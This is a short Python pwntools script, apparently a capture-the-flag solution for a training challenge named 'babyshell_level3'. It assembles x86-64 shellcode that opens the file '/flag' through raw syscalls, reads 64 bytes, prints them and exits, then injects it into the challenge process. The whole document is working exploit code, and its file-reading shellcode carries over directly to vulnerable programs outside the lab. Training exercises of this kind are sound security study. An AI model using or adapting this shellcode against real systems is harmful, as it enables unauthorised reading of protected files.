from pwn import *

context.update(arch="x86-64", encoding="latin")

p = process("/challenge/babyshell_level3")

shellcode = f'''
.global _start
_start:
.intel_syntax noprefix
        mov edi, 0x67616c66
        shl rdi, 8
        mov dil, 0x2f
        push rdi
        mov rdi, rsp 

        xor rsi, rsi
        xor rdx, rdx
        mov al, 2
        syscall

        mov rdi, rax
        mov rsi, rsp
        mov dl, 64
        xor rax, rax
        syscall

        mov dil, 1
        mov rsi, rsp
        mov al, 1
        syscall

        mov al, 60
        xor rdx, rdx
        syscall
'''

shellcode = asm(shellcode)

p.readuntil(b"Reading 0x1000 bytes from stdin.")
p.write(shellcode)
print(p.readall())
